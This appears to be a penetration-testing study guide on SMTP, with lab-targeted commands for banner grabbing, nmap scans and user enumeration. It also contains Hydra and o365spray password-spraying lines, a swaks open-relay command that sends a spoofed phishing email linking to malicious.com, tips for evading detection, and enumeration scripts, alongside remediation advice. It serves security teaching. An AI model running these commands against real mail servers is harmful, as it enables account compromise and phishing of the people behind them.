# SMTP

## SMTP Services

Simple Mail Transfer Protocol (SMTP) is the backbone of email communication across the internet. It handles the transfer of emails between mail servers and from clients to servers. Understanding SMTP's structure and common misconfigurations is essential for comprehensive security assessments.

### Protocol Basics

SMTP typically operates on:

* **Port 25**: Standard unencrypted SMTP
* **Port 465**: SMTP with SSL/TLS encryption (SMTPS)
* **Port 587**: SMTP with STARTTLS (submission port)

#### Protocol Flow

The email delivery process involves multiple components:

1. **MUA (Mail User Agent)**: Email client that composes messages
2. **MSA (Mail Submission Agent)**: Validates email before sending
3. **MTA (Mail Transfer Agent)**: Handles routing between mail servers
4. **MDA (Mail Delivery Agent)**: Delivers email to recipient's mailbox

![SMTP Flow](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

### SMTP Commands

SMTP uses a set of commands for communication between clients and servers:

| **Command**  | **Description**                                       |
| ------------ | ----------------------------------------------------- |
| `AUTH PLAIN` | Authentication service extension                      |
| `HELO`       | Client identifies itself with hostname                |
| `MAIL FROM`  | Specifies the email sender                            |
| `RCPT TO`    | Specifies the email recipient                         |
| `DATA`       | Initiates the transmission of the email               |
| `RSET`       | Aborts the current transaction but keeps connection   |
| `VRFY`       | Verifies if a mailbox is available                    |
| `EXPN`       | Checks mailbox availability and expands mailing lists |
| `NOOP`       | No operation; prevents disconnection due to timeout   |
| `QUIT`       | Terminates the session                                |

### Enumeration Techniques

#### Banner Grabbing

```bash
nc -nv 10.129.14.128 25
```

Example output:

```
220 mail.inlanefreight.htb ESMTP Postfix (Ubuntu)
```

#### Scanning with Nmap

```bash
# Basic scan
nmap -p25 10.129.14.128 -sV

# Script scan
nmap -p25 --script smtp-* 10.129.14.128
```

#### MX Record Enumeration

Identify mail servers using DNS queries:

```bash
# Using host
host -t MX inlanefreight.com

# Using dig
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

Example output:

```
inlanefreight.com.  300  IN  MX  10 mail1.inlanefreight.com.
```

### User Enumeration

SMTP servers can often be abused to enumerate valid email accounts.

#### Using VRFY Command

```bash
telnet 10.129.14.128 25
VRFY root
VRFY admin
VRFY nonexistentuser
```

Example response:

```
220 mail.inlanefreight.htb ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY admin
252 2.0.0 admin
VRFY nonexistentuser
550 5.1.1 <nonexistentuser>: Recipient address rejected: User unknown
```

#### Using EXPN Command

Particularly useful for finding users in distribution lists:

```bash
telnet 10.129.14.128 25
EXPN support-team
```

Example response:

```
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

#### Using RCPT TO Command

This requires initiating an email transaction:

```bash
telnet 10.129.14.128 25
HELO test
MAIL FROM: test@example.com
RCPT TO: admin
RCPT TO: nonexistentuser
```

Example response:

```
220 mail.inlanefreight.htb ESMTP Postfix (Ubuntu)
HELO test
250 mail.inlanefreight.htb
MAIL FROM: test@example.com
250 2.1.0 Ok
RCPT TO: admin
250 2.1.5 Ok
RCPT TO: nonexistentuser
550 5.1.1 <nonexistentuser>: Recipient address rejected: User unknown
```

#### Automated User Enumeration

Using the `smtp-user-enum` tool:

```bash
smtp-user-enum -M VRFY -U userlist.txt -t 10.129.14.128
smtp-user-enum -M EXPN -U userlist.txt -t 10.129.14.128
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.14.128
```

Example output:

```
Starting smtp-user-enum v1.2
Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.14.128: jose@inlanefreight.htb exists
10.129.14.128: pedro@inlanefreight.htb exists
10.129.14.128: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.
```

### Authentication Attacks

Once valid users are identified, authentication attacks can be attempted.

#### Password Spraying with Hydra

```bash
hydra -L users.txt -p 'Password123!' smtp://10.129.14.128
```

Example output:

```
[25][smtp] host: 10.129.14.128   login: admin   password: Password123!
```

### Open Relay Abuse

An SMTP open relay allows anyone to send emails through the server, which can be abused for spam or phishing.

#### Testing for Open Relay

```bash
# Using Nmap
nmap -p25 --script smtp-open-relay 10.129.14.128
```

Example output:

```
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

#### Exploiting Open Relay

Using the `swaks` tool to send emails through an open relay:

```bash
swaks --from spoofed@domain.com --to victim@domain.com --header 'Subject: Urgent Action Required' --body 'Please click on this link: http://malicious.com' --server 10.129.14.128
```

### Cloud Email Services Enumeration

Modern environments often use cloud email services like Microsoft 365 or Google Workspace.

#### O365 Enumeration Example

Using the `o365spray` tool:

```bash
# Validating domain use of O365
python3 o365spray.py --validate --domain targetcompany.com

# Enumerating users
python3 o365spray.py --enum -U users.txt --domain targetcompany.com
```

#### Password Spraying against Cloud Services

```bash
# O365 password spraying
python3 o365spray.py --spray -U valid_users.txt -p 'Spring2023!' --count 1 --lockout 1 --domain targetcompany.com
```

### Vulnerability Assessment

#### Common SMTP Vulnerabilities

1. **Open Relay**: Allows unauthorized email sending
2. **User Enumeration**: Leaks valid usernames
3. **Cleartext Authentication**: Transmits credentials in plaintext
4. **Outdated Software**: May have known vulnerabilities
5. **Missing TLS**: Allows eavesdropping on email communications
6. **Weak Authentication**: Susceptible to brute force attacks

#### Software-Specific Vulnerabilities

| Mail Server        | Notable Vulnerabilities               |
| ------------------ | ------------------------------------- |
| Sendmail < 8.14.9  | Multiple buffer overflows             |
| Exim < 4.92.3      | Remote code execution vulnerabilities |
| Postfix < 3.3.1    | Denial of service vulnerabilities     |
| Microsoft Exchange | ProxyLogon, ProxyShell, etc.          |

### Defense Evasion Techniques

#### Avoiding Detection during SMTP Testing

1. **Rate limiting**: Space out requests to avoid triggering alerts
2. **Careful user selection**: Target non-privileged accounts in password spraying
3. **Session awareness**: Avoid multiple failed authentication attempts
4. **Timeout management**: Use longer timeouts to reduce concurrent connections

### Penetration Testing Methodology

When testing SMTP services, follow these steps:

1. **Discovery**: Identify mail servers through DNS and port scanning
2. **Version Enumeration**: Determine SMTP server type and version
3. **User Enumeration**: Identify valid email addresses or accounts
4. **Authentication Testing**: Test for weak credentials
5. **Open Relay Testing**: Check if the server can be abused to send emails
6. **TLS Configuration**: Verify proper encryption implementation
7. **Vulnerability Assessment**: Check for known CVEs based on version
8. **Exploitation**: Test identified vulnerabilities
9. **Post-Exploitation**: Leverage access for further objectives

### Remediation Strategies

When reporting SMTP vulnerabilities, consider recommending:

1. **Disable VRFY/EXPN commands** unless required
2. **Implement authentication** for all SMTP transactions
3. **Enable TLS** for all communications
4. **Update mail server software** regularly
5. **Implement rate limiting** to prevent brute force attacks
6. **Configure SPF, DKIM, and DMARC** to prevent spoofing
7. **Regular security testing** of email infrastructure

### Practical Testing Scripts

#### Simple SMTP User Enumeration Script

```bash
#!/bin/bash
# Simple SMTP user enumeration script
SERVER=$1
WORDLIST=$2

for user in $(cat $WORDLIST); do
    echo "Testing $user"
    echo -e "VRFY $user\r\n" | nc -nv -w 2 $SERVER 25 2>/dev/null | grep "^252"
    sleep 1
done
```

#### Testing All SMTP Commands

```bash
#!/bin/bash
# Test which SMTP commands are supported
SERVER=$1

commands=("HELO test" "EHLO test" "VRFY root" "EXPN root" "RCPT TO:<root>" "HELP" "AUTH LOGIN")

for cmd in "${commands[@]}"; do
    echo -e "\nTesting: $cmd"
    echo -e "$cmd\r\nQUIT\r\n" | nc -nv -w 2 $SERVER 25
done
```

By understanding SMTP services and their security implications, penetration testers can effectively identify and exploit misconfigurations and vulnerabilities in email systems.
